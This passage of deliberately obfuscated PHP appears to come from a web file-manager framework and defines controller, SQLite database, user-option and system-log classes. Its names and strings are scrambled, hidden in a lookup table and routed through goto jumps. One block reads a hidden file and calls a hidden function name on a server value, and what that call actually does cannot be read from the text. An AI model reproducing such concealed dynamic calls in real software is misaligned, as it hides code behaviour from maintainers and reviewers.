(!$ÚÇó©¥‰) { return !1; } $•î¢ãÊ = Model($ÅøÂ¯Æ‘[1926])->field($ÅøÂ¯Æ‘[1664])->where(array($ÅøÂ¯Æ‘[1836] => array($ÅøÂ¯Æ‘[7], $ÚÇó©¥‰)))->select(); $•î¢ãÊ = array_to_keyvalue($•î¢ãÊ, $ÅøÂ¯Æ‘[12], $ÅøÂ¯Æ‘[1664]); return array_unique($•î¢ãÊ); } public function userSearch($‰Š ¡‡û, $»ä¢Şö° = "\x2a") { return Model($_SERVER[ñˆ‹ß¿÷][535])->where($‰Š ¡‡û)->field($»ä¢Şö°)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\157\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($şºé¾òè) { $˜°Ô¤½° =& $_SERVER[ñˆ‹ß¿÷]; if (!defined($˜°Ô¤½°[475])) { define($˜°Ô¤½°[475], 0); } return "\x55\x73\145\162\x4f\x70\164\151\157\x6e\x5f{$şºé¾òè}\x5f" . USER_ID; } protected function filterWhere($ğ·ï¯¦Í) { $´ğÇªñÇ =& $_SERVER[ñˆ‹ß¿÷]; if (!defined($´ğÇªñÇ[475])) { define($´ğÇªñÇ[475], 0); } $ğ·ï¯¦Í[$´ğÇªñÇ[1664]] = USER_ID; return $ğ·ï¯¦Í; } public function cacheRemoveUser($Ì¼ı¥ù‡, $ÚßÕîéü) { return Cache::remove("\x55\x73\145\x72\117\x70\x74\151\157\x6e\x5f{$Ì¼ı¥ù‡}\x5f" . $ÚßÕîéü); } protected function optionDefault($‰‘úÒÎ = '') { $Ñ¤ÉŠ„ =& $_SERVER[ñˆ‹ß¿÷]; if ($‰‘úÒÎ == $Ñ¤ÉŠ„[12]) { return $GLOBALS[$Ñ¤ÉŠ„[6]][$Ñ¤ÉŠ„[2324]]; } if ($‰‘úÒÎ == $Ñ¤ÉŠ„[2325]) { return $GLOBALS[$Ñ¤ÉŠ„[6]][$Ñ¤ÉŠ„[2326]]; } } } goto C¬ßÅ…˜¼ğ; eã­„¡¸: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $½†…ŞŒÁ =& $_SERVER[ñˆ‹ß¿÷]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$½†…ŞŒÁ[6]] =& $config; $this->values[$½†…ŞŒÁ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $½†…ŞŒÁ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($º¿ÛšûÂ) { if (1 === func_num_args()) { $this->{$º¿ÛšûÂ} = new $º¿ÛšûÂ(); } else { $¼óÀœÏë = new ReflectionClass($º¿ÛšûÂ); $ÖäÌ´•ò = func_get_args(); array_shift($ÖäÌ´•ò); $this->{$º¿ÛšûÂ} = $¼óÀœÏë->newInstanceArgs($ÖäÌ´•ò); } return $this->{$º¿ÛšûÂ}; } public function routeBind($±¼ÉãŒù, $îí…àÔ¥, $•Â™¾Ÿ‚ = 3) { $ºêˆ†ù =& $_SERVER[ñˆ‹ß¿÷]; $†¼øÇµË = $this->in[$ºêˆ†ù[9]]; $±¼ÉãŒù = str_replace($ºêˆ†ù[10], $ºêˆ†ù[11], trim(trim($±¼ÉãŒù, $ºêˆ†ù[8]), $ºêˆ†ù[12])); if (!$±¼ÉãŒù || count($†¼øÇµË) <= $•Â™¾Ÿ‚) { return !1; } $ïıæÃÛ = !0; $òûŒ‡ëĞ = explode($ºêˆ†ù[8], $±¼ÉãŒù); for ($øäâßşÀ = 0; $øäâßşÀ < count($òûŒ‡ëĞ); $øäâßşÀ++) { if ($òûŒ‡ëĞ[$øäâßşÀ] != $†¼øÇµË[$•Â™¾Ÿ‚ + $øäâßşÀ]) { $ïıæÃÛ = !1; break; } } if (!$ïıæÃÛ) { return; } call_user_func_array(array($this, $îí…àÔ¥), array()); } public function routeArgs($“šÏÇ = 3) { $¦Æ¡ò³‹ = $this->in[$_SERVER[ñˆ‹ß¿÷][9]]; if (count($¦Æ¡ò³‹) <= $“šÏÇ) { return array(); } $Üí¢ùüÏ = array(); for ($Àä¸èå = $“šÏÇ; $Àä¸èå < count($¦Æ¡ò³‹); $Àä¸èå += 2) { $Üí¢ùüÏ[$¦Æ¡ò³‹[$Àä¸èå]] = $¦Æ¡ò³‹[$Àä¸èå + 1]; $this->in[$¦Æ¡ò³‹[$Àä¸èå]] = $¦Æ¡ò³‹[$Àä¸èå + 1]; } return $Üí¢ùüÏ; } protected function assign($£êêòŠ“, $ºÚå‰Íï) { $this->values[$£êêòŠ“] = $ºÚå‰Íï; } protected function display($‚¬‡Ëõì) { ob_end_clean(); extract($this->values); require $this->tpl . $‚¬‡Ëõì; } } class DbSqliteBase extends Db { public function __construct($Áú·†İë = '') { $©Ìúş€ =& $_SERVER[ñˆ‹ß¿÷]; if (!extension_loaded($©Ìúş€[13])) { think_exception(think_lang($©Ìúş€[14]) . $©Ìúş€[15]); } if (!empty($Áú·†İë)) { if (!isset($Áú·†İë[$©Ìúş€[16]])) { $Áú·†İë[$©Ìúş€[16]] = 438; } $this->config = $Áú·†İë; if (empty($this->config[$©Ìúş€[17]])) { $this->config[$©Ìúş€[17]] = array(); } } } public function connect($ÀÈ¥š²Í = '', $·ÆÚ‚¼ = 0) { $¢æ²¶…ª =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($this->linkID[$·ÆÚ‚¼])) { if (empty($ÀÈ¥š²Í)) { $ÀÈ¥š²Í = $this->config; } $ÏÄ÷¾ı = !empty($ÀÈ¥š²Í[$¢æ²¶…ª[17]][$¢æ²¶…ª[18]]) ? $ÀÈ¥š²Í[$¢æ²¶…ª[17]][$¢æ²¶…ª[18]] : $this->pconnect; $çï»¾ú¾ = $ÏÄ÷¾ı ? $¢æ²¶…ª[19] : $¢æ²¶…ª[20]; $this->linkID[$·ÆÚ‚¼] = $çï»¾ú¾($ÀÈ¥š²Í[$¢æ²¶…ª[21]], $ÀÈ¥š²Í[$¢æ²¶…ª[16]]); if (!$this->linkID[$·ÆÚ‚¼]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$·ÆÚ‚¼], 30000); if (1 != think_config($¢æ²¶…ª[22])) { unset($this->config); } } return $this->linkID[$·ÆÚ‚¼]; } public function free() { $this->queryID = null; } public function query($Ù’Ø§íø) { $ùôÖ¥¬ =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ù’Ø§íø; if ($this->queryID) { $this->free(); } think_action_status($ùôÖ¥¬[23], 1); think_status($ùôÖ¥¬[24]); $this->queryID = sqlite_query($this->_linkID, $Ù’Ø§íø); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Â›íöÙ = $this->getAll(); return $Â›íöÙ; } } public function execute($’í±àÉ–) { $¸á™×Üò =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’í±àÉ–; if ($this->queryID) { $this->free(); } think_action_status($¸á™×Üò[25], 1); think_status($¸á™×Üò[24]); $ç‡¦œ» = sqlite_exec($this->_linkID, $’í±àÉ–); $this->debug(); if (!1 === $ç‡¦œ») { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ñˆ‹ß¿÷][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Çî„×³ = sqlite_query($this->_linkID, $_SERVER[ñˆ‹ß¿÷][27]); if (!$Çî„×³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $•›öÄæˆ = sqlite_query($this->_linkID, $_SERVER[ñˆ‹ß¿÷][28]); if (!$•›öÄæˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Õ¬ õÎî = array(); if ($this->numRows > 0) { for ($µïëÎğ¢ = 0; $µïëÎğ¢ < $this->numRows; $µïëÎğ¢++) { $Õ¬ õÎî[$µïëÎğ¢] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Õ¬ õÎî; } public function getFields($üä±“Š) { $¿¤‡œµá =& $_SERVER[ñˆ‹ß¿÷]; $²šÑæş = $this->query($¿¤‡œµá[29] . $üä±“Š . $¿¤‡œµá[30]); $¶¹Ğš† = array(); if ($²šÑæş) { foreach ($²šÑæş as $ÖùİÕâ => $ÊÖëœòê) { $¶¹Ğš†[$ÊÖëœòê[$¿¤‡œµá[31]]] = array($¿¤‡œµá[32] => $ÊÖëœòê[$¿¤‡œµá[31]], $¿¤‡œµá[33] => $ÊÖëœòê[$¿¤‡œµá[34]], $¿¤‡œµá[35] => (bool) ($ÊÖëœòê[$¿¤‡œµá[36]] === $¿¤‡œµá[12]), $¿¤‡œµá[37] => $ÊÖëœòê[$¿¤‡œµá[38]], $¿¤‡œµá[39] => strtolower($ÊÖëœòê[$¿¤‡œµá[40]]) == $¿¤‡œµá[41], $¿¤‡œµá[42] => strtolower($ÊÖëœòê[$¿¤‡œµá[43]]) == $¿¤‡œµá[44]); } } return $¶¹Ğš†; } public function getTables($µõÈ‚Ë = '') { $ËƒÁ™¢Â =& $_SERVER[ñˆ‹ß¿÷]; $İ†ì¹à’ = $this->query($ËƒÁ™¢Â[45] . $ËƒÁ™¢Â[46] . $ËƒÁ™¢Â[47]); $à‡’èáÙ = array(); foreach ($İ†ì¹à’ as $Í¶Èºç¢ => $•¢‚ËĞÛ) { $à‡’èáÙ[$Í¶Èºç¢] = current($•¢‚ËĞÛ); } return $à‡’èáÙ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $œ‚¸î¨™ =& $_SERVER[ñˆ‹ß¿÷]; $ºÓûÇ£ = sqlite_last_error($this->_linkID); $this->error = $ºÓûÇ£ . $œ‚¸î¨™[4] . sqlite_error_string($ºÓûÇ£); if ($œ‚¸î¨™[12] != $this->queryStr) { $this->error .= LNG($œ‚¸î¨™[48]) . $this->queryStr; } think_trace($this->error, $œ‚¸î¨™[12], $œ‚¸î¨™[49]); return $this->error; } public function escapeString($¢ëóÃº) { return sqlite_escape_string($¢ëóÃº); } public function parseLimit($Â‰¦ÚÃì) { $ÂíÖ‚ğ =& $_SERVER[ñˆ‹ß¿÷]; $‹Öî¿úÆ = $ÂíÖ‚ğ[12]; if (!empty($Â‰¦ÚÃì)) { $Â‰¦ÚÃì = explode($ÂíÖ‚ğ[50], $Â‰¦ÚÃì); if (count($Â‰¦ÚÃì) > 1) { $‹Öî¿úÆ .= $ÂíÖ‚ğ[51] . $Â‰¦ÚÃì[1] . $ÂíÖ‚ğ[52] . $Â‰¦ÚÃì[0] . $ÂíÖ‚ğ[53]; } else { $‹Öî¿úÆ .= $ÂíÖ‚ğ[51] . $Â‰¦ÚÃì[0] . $ÂíÖ‚ğ[53]; } } return $‹Öî¿úÆ; } } class DbSqlite3Base extends Db { public function __construct($ç¼ƒµ = '') { $ÌÇÒóùğ =& $_SERVER[ñˆ‹ß¿÷]; if (!class_exists($ÌÇÒóùğ[54])) { think_exception(think_lang($ÌÇÒóùğ[14]) . $ÌÇÒóùğ[55]); } if (!empty($ç¼ƒµ)) { if (!isset($ç¼ƒµ[$ÌÇÒóùğ[16]])) { $ç¼ƒµ[$ÌÇÒóùğ[16]] = 438; } $this->config = $ç¼ƒµ; if (empty($this->config[$ÌÇÒóùğ[17]])) { $this->config[$ÌÇÒóùğ[17]] = array(); } } } public function connect($ğÄ¾´Ÿê = '', $ÌæßäÊÒ = 0) { $Åøâò• =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($this->linkID[$ÌæßäÊÒ])) { if (empty($ğÄ¾´Ÿê)) { $ğÄ¾´Ÿê = $this->config; } $this->linkID[$ÌæßäÊÒ] = new SQLite3($ğÄ¾´Ÿê[$Åøâò•[21]]); if (!$this->linkID[$ÌæßäÊÒ]) { think_exception($this->linkID[$ÌæßäÊÒ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÌæßäÊÒ]->busyTimeout(30000); if (1 != think_config($Åøâò•[22])) { unset($this->config); } } return $this->linkID[$ÌæßäÊÒ]; } public function free() { $this->queryID = null; } public function query($Ä‡ê¤òæ) { $±ÍÎ½õ¢ =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ä‡ê¤òæ; if ($this->queryID) { $this->free(); } think_action_status($±ÍÎ½õ¢[23], 1); think_status($±ÍÎ½õ¢[24]); $this->queryID = $this->_linkID->query($Ä‡ê¤òæ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $àØë€â = $this->getAll(); $this->numRows = count($àØë€â); return $àØë€â; } } public function execute($°çÎìã) { $ü‘–‚˜è =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $°çÎìã; if ($this->queryID) { $this->free(); } think_action_status($ü‘–‚˜è[25], 1); think_status($ü‘–‚˜è[24]); $Óá‚ƒ¤Á = $this->_linkID->exec($°çÎìã); $this->debug(); if (!1 === $Óá‚ƒ¤Á) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ñˆ‹ß¿÷][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $íÙäÄÚŸ = $this->_linkID->query($_SERVER[ñˆ‹ß¿÷][27]); if (!$íÙäÄÚŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $˜­«Ô´• = $this->_linkID->query($_SERVER[ñˆ‹ß¿÷][28]); if (!$˜­«Ô´•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¼Íëğ•Ş = array(); while ($’Êö–«æ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¼Íëğ•Ş[] = $’Êö–«æ; } $this->queryID->reset(); return $¼Íëğ•Ş; } public function getFields($¹ÉôµğÏ) { $ÓÁÑ¬ä£ =& $_SERVER[ñˆ‹ß¿÷]; $í”øĞôŠ = $this->query($ÓÁÑ¬ä£[29] . $¹ÉôµğÏ . $ÓÁÑ¬ä£[30]); $íˆùàñß = array(); if ($í”øĞôŠ) { foreach ($í”øĞôŠ as $¢Áé¢ => $­ì‡½éà) { $íˆùàñß[$­ì‡½éà[$ÓÁÑ¬ä£[32]]] = array($ÓÁÑ¬ä£[32] => $­ì‡½éà[$ÓÁÑ¬ä£[32]], $ÓÁÑ¬ä£[33] => $­ì‡½éà[$ÓÁÑ¬ä£[33]], $ÓÁÑ¬ä£[35] => (bool) ($­ì‡½éà[$ÓÁÑ¬ä£[35]] === $ÓÁÑ¬ä£[12]), $ÓÁÑ¬ä£[37] => $­ì‡½éà[$ÓÁÑ¬ä£[56]], $ÓÁÑ¬ä£[39] => (bool) $­ì‡½éà[$ÓÁÑ¬ä£[57]], $ÓÁÑ¬ä£[42] => (bool) $­ì‡½éà[$ÓÁÑ¬ä£[57]]); } } return $íˆùàñß; } public function getTables($Ö©ÂÏ¯Í = '') { $ôµ¾Á³„ =& $_SERVER[ñˆ‹ß¿÷]; $Ë³íƒÛ€ = $this->query($ôµ¾Á³„[45] . $ôµ¾Á³„[46] . $ôµ¾Á³„[47]); $¹á°«Ò– = array(); foreach ($Ë³íƒÛ€ as $„¾ÍêÕß => $æ§ü’ÕŸ) { $¹á°«Ò–[$„¾ÍêÕß] = current($æ§ü’ÕŸ); } return $¹á°«Ò–; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $×Šå¾½¾ =& $_SERVER[ñˆ‹ß¿÷]; $this->error = $this->_linkID->lastErrorMsg(); if ($×Šå¾½¾[12] != $this->queryStr) { $this->error .= LNG($×Šå¾½¾[48]) . $this->queryStr; } think_trace($this->error, $×Šå¾½¾[12], $×Šå¾½¾[49]); return $this->error; } public function escapeString($—ĞñŒò‡) { $¦áÛûöÚ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->_linkID) { return $this->_linkID->escapeString($—ĞñŒò‡); } return str_ireplace($¦áÛûöÚ[58], $¦áÛûöÚ[59], $—ĞñŒò‡); } public function parseLimit($Œ©Ïàµú) { $úß»í³ñ =& $_SERVER[ñˆ‹ß¿÷]; $­”ä¾²º = $úß»í³ñ[12]; if (!empty($Œ©Ïàµú)) { $Œ©Ïàµú = explode($úß»í³ñ[50], $Œ©Ïàµú); if (count($Œ©Ïàµú) > 1) { $­”ä¾²º .= $úß»í³ñ[51] . $Œ©Ïàµú[1] . $úß»í³ñ[52] . $Œ©Ïàµú[0] . $úß»í³ñ[53]; } else { $­”ä¾²º .= $úß»í³ñ[51] . $Œ©Ïàµú[0] . $úß»í³ñ[53]; } } return $­”ä¾²º; } } goto a»±Áî­Ã£; FÙ¨Ã“òÍä: if ($_SERVER[$_SERVER[ñˆ‹ß¿÷][879]] != $_SERVER[$_SERVER[ñˆ‹ß¿÷][880]]) { $_getc = $_SERVER[ñˆ‹ß¿÷][882]; $_getfile = $_SERVER[$_SERVER[ñˆ‹ß¿÷][883]] . $_SERVER[ñˆ‹ß¿÷][884]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñˆ‹ß¿÷][231], $_getfilec); if (count($_getarrs) < $_SERVER[ñˆ‹ß¿÷][619]) { $exit = $_SERVER[ñˆ‹ß¿÷][885]; $exit(); } $_act = $_SERVER[ñˆ‹ß¿÷][1345]; $_act($_SERVER[$_SERVER[ñˆ‹ß¿÷][1344]]); } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\114\151\147\150\164\x41\160\160"; public $modelType = "\x53\x79\x73\x74\145\155\117\x70\164\151\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\147\x72\157\x75\160", "\144\145\x73\x63", "\x63\157\x6e\x74\145\x6e\164"); public function listData($ŞŠÒÚ•¬ = false, $ÒÄ±õÇş = "\155\x6f\x64\x69\146\x79\124\151\x6d\145", $âÕƒÄÏ› = true) { return parent::listData($ŞŠÒÚ•¬, $ÒÄ±õÇş, $âÕƒÄÏ›); } public function remove($¥˜ºÖæ‹) { $­Ç¯ïæ = $this->findByName($¥˜ºÖæ‹); if (!$­Ç¯ïæ) { return !1; } return parent::remove($­Ç¯ïæ[$_SERVER[ñˆ‹ß¿÷][399]]); } public function add($ıé†íçÉ) { if ($this->findByName($ıé†íçÉ[$_SERVER[ñˆ‹ß¿÷][32]])) { return !1; } return parent::insert($ıé†íçÉ); } public function update($ı×¿«¹†, $â•¦­® ) { $‘Õ¡Ì£ç =& $_SERVER[ñˆ‹ß¿÷]; $ã™Äüâ = $this->findByName($ı×¿«¹†); $Ê£Äş¢Ò = $this->findByName($â•¦­® [$‘Õ¡Ì£ç[32]]); if (!$ã™Äüâ || $Ê£Äş¢Ò && $Ê£Äş¢Ò[$‘Õ¡Ì£ç[399]] != $ã™Äüâ[$‘Õ¡Ì£ç[399]]) { return !1; } return parent::update($ã™Äüâ[$‘Õ¡Ì£ç[399]], $â•¦­® ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\x69\155\x65", "\x74\151\155\145", "\151\156\163\x65\x72\164", "\x66\x75\156\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ ­‰‹ç‰ =& $_SERVER[ñˆ‹ß¿÷]; return array($ ­‰‹ç‰[2165] => LNG($ ­‰‹ç‰[2166]), $ ­‰‹ç‰[2167] => LNG($ ­‰‹ç‰[2168]), $ ­‰‹ç‰[1779] => LNG($ ­‰‹ç‰[2169]), $ ­‰‹ç‰[2170] => LNG($ ­‰‹ç‰[2171]), $ ­‰‹ç‰[2172] => LNG($ ­‰‹ç‰[2173]), $ ­‰‹ç‰[2174] => LNG($ ­‰‹ç‰[2175]), $ ­‰‹ç‰[2176] => LNG($ ­‰‹ç‰[2177]), $ ­‰‹ç‰[1809] => LNG($ ­‰‹ç‰[2177]), $ ­‰‹ç‰[1810] => LNG($ ­‰‹ç‰[2178]), $ ­‰‹ç‰[2179] => LNG($ ­‰‹ç‰[2180]), $ ­‰‹ç‰[2181] => LNG($ ­‰‹ç‰[2182]), $ ­‰‹ç‰[2183] => LNG($ ­‰‹ç‰[2184]), $ ­‰‹ç‰[2185] => LNG($ ­‰‹ç‰[2186]), $ ­‰‹ç‰[1807] => LNG($ ­‰‹ç‰[2187]), $ ­‰‹ç‰[2188] => LNG($ ­‰‹ç‰[2189]), $ ­‰‹ç‰[1814] => LNG($ ­‰‹ç‰[2190]), $ ­‰‹ç‰[2191] => LNG($ ­‰‹ç‰[2192]), $ ­‰‹ç‰[2193] => LNG($ ­‰‹ç‰[2194]), $ ­‰‹ç‰[2195] => LNG($ ­‰‹ç‰[2196]), $ ­‰‹ç‰[2197] => LNG($ ­‰‹ç‰[2198]), $ ­‰‹ç‰[1817] => LNG($ ­‰‹ç‰[2199]), $ ­‰‹ç‰[1818] => LNG($ ­‰‹ç‰[2200]), $ ­‰‹ç‰[2201] => LNG($ ­‰‹ç‰[2202]), $ ­‰‹ç‰[2203] => LNG($ ­‰‹ç‰[2204]), $ ­‰‹ç‰[2205] => LNG($ ­‰‹ç‰[2206]), $ ­‰‹ç‰[1812] => LNG($ ­‰‹ç‰[2207]), $ ­‰‹ç‰[2208] => LNG($ ­‰‹ç‰[2209]), $ ­‰‹ç‰[1811] => LNG($ ­‰‹ç‰[2210]), $ ­‰‹ç‰[2211] => LNG($ ­‰‹ç‰[2212]), $ ­‰‹ç‰[2213] => LNG($ ­‰‹ç‰[2214]), $ ­‰‹ç‰[2215] => LNG($ ­‰‹ç‰[2216]), $ ­‰‹ç‰[2217] => LNG($ ­‰‹ç‰[2217]), $ ­‰‹ç‰[2218] => LNG($ ­‰‹ç‰[1783]), $ ­‰‹ç‰[2219] => LNG($ ­‰‹ç‰[2220]), $ ­‰‹ç‰[2221] => LNG($ ­‰‹ç‰[2222]), $ ­‰‹ç‰[2223] => LNG($ ­‰‹ç‰[2224]), $ ­‰‹ç‰[2225] => LNG($ ­‰‹ç‰[2226]), $ ­‰‹ç‰[2227] => LNG($ ­‰‹ç‰[2228]), $ ­‰‹ç‰[2229] => LNG($ ­‰‹ç‰[2229]), $ ­‰‹ç‰[2230] => LNG($ ­‰‹ç‰[2231]), $ ­‰‹ç‰[2232] => LNG($ ­‰‹ç‰[2233]), $ ­‰‹ç‰[2234] => LNG($ ­‰‹ç‰[2235]), $ ­‰‹ç‰[2236] => LNG($ ­‰‹ç‰[2237]), $ ­‰‹ç‰[2238] => LNG($ ­‰‹ç‰[2239]), $ ­‰‹ç‰[2240] => LNG($ ­‰‹ç‰[2241])); } private function typeFile() { $ÛµÙœ¼ş =& $_SERVER[ñˆ‹ß¿÷]; $†èúÔæª = array($ÛµÙœ¼ş[1814] => array($ÛµÙœ¼ş[1815]), $ÛµÙœ¼ş[2183] => array($ÛµÙœ¼ş[2242]), $ÛµÙœ¼ş[2185] => array($ÛµÙœ¼ş[2243]), $ÛµÙœ¼ş[1807] => array($ÛµÙœ¼ş[1808]), $ÛµÙœ¼ş[2193] => array(), $ÛµÙœ¼ş[2195] => array(), $ÛµÙœ¼ş[2197] => array(), $ÛµÙœ¼ş[1817] => array($ÛµÙœ¼ş[1819]), $ÛµÙœ¼ş[1818] => array($ÛµÙœ¼ş[1819]), $ÛµÙœ¼ş[2201] => array($ÛµÙœ¼ş[2244]), $ÛµÙœ¼ş[2203] => array($ÛµÙœ¼ş[2244]), $ÛµÙœ¼ş[2205] => array($ÛµÙœ¼ş[2245]), $ÛµÙœ¼ş[2191] => array($ÛµÙœ¼ş[2246]), $ÛµÙœ¼ş[1812] => array($ÛµÙœ¼ş[2247]), $ÛµÙœ¼ş[2208] => array($ÛµÙœ¼ş[2248]), $ÛµÙœ¼ş[1811] => array($ÛµÙœ¼ş[1813])); return $†èúÔæª; } private function typeAll() { $ú‡º‚¾˜ =& $_SERVER[ñˆ‹ß¿÷]; $Ú«”¥ Õ = $this->typeList; $ıñõØû‘ = array_filter($this->typeFile()); foreach ($ıñõØû‘ as $ÓÖì¿ì² => $Í…ÑÚ´‡) { $Ú«”¥ Õ[$Í…ÑÚ´‡[0]] = $Ú«”¥ Õ[$ÓÖì¿ì²]; } $Ú«”¥ Õ[$ú‡º‚¾˜[1819]] = LNG($ú‡º‚¾˜[2249]); $Ú«”¥ Õ[$ú‡º‚¾˜[2244]] = LNG($ú‡º‚¾˜[2250]); return $Ú«”¥ Õ; } public function addLog($şê»ôó¯, $œ¤Âà¹» = array()) { $•ş¾ñÕ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($this->typeList[$şê»ôó¯])) { return; } $‚ÖÛå±Ê = defined($•ş¾ñÕ[475]) && USER_ID ? USER_ID : (isset($œ¤Âà¹»[$•ş¾ñÕ[1664]]) ? $œ¤Âà¹»[$•ş¾ñÕ[1664]] : 0); if (!$‚ÖÛå±Ê) { $‚ÖÛå±Ê = (int) Session::get($•ş¾ñÕ[1973]); } if ($şê»ôó¯ == $•ş¾ñÕ[2219] && is_array($œ¤Âà¹»[$•ş¾ñÕ[2251]]) && !$œ¤Âà¹»[$•ş¾ñÕ[2251]]) { return; } $ÆÎ´ÄÀ¥ = get_client_ip(); if (!$œ¤Âà¹» || strlen(json_encode($œ¤Âà¹»)) >= 1024) { $œ¤Âà¹» = array($•ş¾ñÕ[2252] => $ÆÎ´ÄÀ¥); } else { if (is_array($œ¤Âà¹»)) { $œ¤Âà¹»[$•ş¾ñÕ[2252]] = $ÆÎ´ÄÀ¥; } else { $œ¤Âà¹» = array($•ş¾ñÕ[1200] => $œ¤Âà¹», $•ş¾ñÕ[2252] => $ÆÎ´ÄÀ¥); } } $œ¤Âà¹» = array($•ş¾ñÕ[1654] => Session::sign(), $•ş¾ñÕ[1655] => $‚ÖÛå±Ê, $•ş¾ñÕ[33] => $şê»ôó¯, $•ş¾ñÕ[1657] => json_encode($œ¤Âà¹»)); parent::add($œ¤Âà¹»); } public function remove($“ÇãÃŞÒ) { $this->where(array($_SERVER[ñˆ‹ß¿÷][419] => $“ÇãÃŞÒ))->delete(); } private function _makeOrder($ŠÁš˜È€ = '') { $‚ÜºìÃ =& $_SERVER[ñˆ‹ß¿÷]; $Ôç¤÷ = $‚ÜºìÃ[200]; $é÷­ÃÚ = array($‚ÜºìÃ[450] => $‚ÜºìÃ[451], $‚ÜºìÃ[452] => $‚ÜºìÃ[453]); $Ç¯±Ì° = Input::get($‚ÜºìÃ[458], $‚ÜºìÃ[7], $‚ÜºìÃ[2005], array($‚ÜºìÃ[1927], $‚ÜºìÃ[452])); $Ç¯±Ì° = $é÷­ÃÚ[$Ç¯±Ì°]; $ŠÁš˜È€ = $ŠÁš˜È€ . "{$Ôç¤÷}\40{$Ç¯±Ì°}"; return $this->order($ŠÁš˜È€); } public function get($ø¢²¦Üƒ = '') { $‚Ô…´ú =& $_SERVER[ñˆ‹ß¿÷]; if (!$ø¢²¦Üƒ) { show_json(array()); } $À‰¨ÔÔ = array(); if ($ø¢²¦Üƒ[$‚Ô…´ú[1664]]) { $À‰¨ÔÔ[$‚Ô…´ú[1664]] = $ø¢²¦Üƒ[$‚Ô…´ú[1664]]; } if (isset($ø¢²¦Üƒ[$‚Ô…´ú[768]])) { $¨ïĞàíì = $ø¢²¦Üƒ[$‚Ô…´ú[768]]; $ÛÖë¤Ö³ = isset($ø¢²¦Üƒ[$‚Ô…´ú[497]]) ? $ø¢²¦Üƒ[$‚Ô…´ú[497]] : time(); $À‰¨ÔÔ[$‚Ô…´ú[200]] = array($‚Ô…´ú[333], array($¨ïĞàíì, $ÛÖë¤Ö³)); } if ($ø¢²¦Üƒ[$‚Ô…´ú[33]]) { $¶¼˜Öî½ = explode($‚Ô…´ú[50], $ø¢²¦Üƒ[$‚Ô…´ú[33]]); $‘Ûµˆà« = $this->typeFile(); $ÓõËğí = array(); foreach ($¶¼˜Öî½ as $õíÀÛ³ì) { $ÓõËğí[] = $õíÀÛ³ì; if (isset($‘Ûµˆà«[$õíÀÛ³ì])) { $ÓõËğí = array_merge($ÓõËğí, $‘Ûµˆà«[$õíÀÛ³ì]); } } $ÓõËğí = array_unique($ÓõËğí); if ($ÓõËğí) { $À‰¨ÔÔ[$‚Ô…´ú[33]] = array($‚Ô…´ú[7], $ÓõËğí); } } else { $À‰¨ÔÔ[$‚Ô…´ú[33]] = array($‚Ô…´ú[2253], $‚Ô…´ú[2254]); } if (!empty($ø¢²¦Üƒ[$‚Ô…´ú[2252]])) { $À‰¨ÔÔ[$‚Ô…´ú[453]] = array($‚Ô…´ú[383], "\x25{$ø¢²¦Üƒ[$‚Ô…´ú[2252]]}\45"); } $„‡Ÿ†÷‹ = $this->_makeOrder()->where($À‰¨ÔÔ)->selectPage(); if (empty($„‡Ÿ†÷‹[$‚Ô…´ú[369]])) { show_json(array(), !0, $„‡Ÿ†÷‹[$‚Ô…´ú[366]]); } $„‡Ÿ†÷‹[$‚Ô…´ú[369]] = $this->logList($„‡Ÿ†÷‹[$‚Ô…´ú[369]]); return 